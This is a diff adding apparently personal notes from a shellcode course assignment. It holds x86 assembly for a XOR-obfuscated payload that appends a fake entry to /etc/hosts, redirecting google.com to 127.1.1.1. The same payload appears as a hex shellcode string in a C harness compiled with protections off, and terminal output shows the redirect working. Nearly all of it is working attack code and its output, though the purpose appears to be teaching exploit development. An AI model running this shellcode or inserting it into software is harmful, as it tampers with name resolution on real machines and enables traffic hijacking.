@@ -1,0 +1,128 @@
+http://shell-storm.org/shellcode/files/shellcode-893.php
+
+seems to be a good 
+
+77 bytes
+
+
+
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ cat test.asm                                                                [12/1847]
+global _start
+
+section .text
+
+_start:
+    xor ecx,ecx
+    xor eax,eax
+    xor ebx,ebx
+
+    push ecx
+    push 0xd9ded9c5     ;/etc///hosts xored with 0xaaaaaaaa
+    push 0xc2858585
+    push 0xc9decf85
+    mov ebx, esp
+    mov edx, esp
+    mov cl,0x3
+
+xor_decoder:
+    mov eax,dword [edx]
+    xor eax,0xaaaaaaaa
+    mov dword [edx],eax
+    add edx,0x4
+    loop xor_decoder
+
+    mov ecx,0x401         ;permmisions
+    xor eax,eax
+    mov al,0x5
+    int 0x80        ;syscall to open file
+
+    xchg eax, ebx
+    push 0x4
+    pop eax
+    jmp short _load_data    ;jmp-call-pop technique to load the map
+
+_write:
+    pop ecx
+    push 20         ;length of the string, dont forget to modify if changes the map
+    pop edx
+    int 0x80        ;syscall to write in the file
+
+    push 0x6
+    pop eax
+    int 0x80        ;syscall to close the file
+
+    push 0x1
+    pop eax
+    int 0x80        ;syscall to exit
+
+_load_data:
+    call _write
+    google db "127.1.1.1 google.com"
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$
+
+
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ ./compile.sh test
+ Assembling with nasm
+Success, Now Linking
+Go Ahead, may the force be with you
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ sudo ./test
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ cat /etc/hosts
+#127.0.0.1      localhost
+#127.0.1.1      ubuntu
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+127.1.1.1 google.comtoor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ ping google.com
+PING google.com (127.1.1.1) 56(84) bytes of data.
+64 bytes from google.com (127.1.1.1): icmp_req=1 ttl=64 time=0.073 ms
+64 bytes from google.com (127.1.1.1): icmp_req=2 ttl=64 time=0.047 ms
+^C
+--- google.com ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 999ms
+rtt min/avg/max/mdev = 0.047/0.060/0.073/0.013 ms
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$
+
+
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ cat shellcodetest.c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc9\x31\xc0\x31\xdb\x51\x68\xc5\xd9\xde\xd9\x68\x85\x85\x85\xc2\x68\x85\xcf\xde\xc9\x89\xe3\x89\xe2\xb1\x03\x8b\x02\x35\xaa\xaa\xaa\xaa\x89\x02\x83\xc2\x04\xe2\xf2\x66\xb9\x01\x04\x31\xc0\xb0\x05\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";
+
+int main(void)
+{
+
+        printf("shellcode length: %d\n",strlen(code));
+        (*(void(*)()) code)();
+}
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$
+
+
+
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ nano shellcodetest.c
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ sudo ./shellcode
+shellcode length: 99
+toor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$ cat /etc/hosts
+#127.0.0.1      localhost
+#127.0.1.1      ubuntu
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+127.1.1.1 google.comtoor@ubuntu:~/Desktop/slae/Assignments/6/etc_hosts$
+
+
+
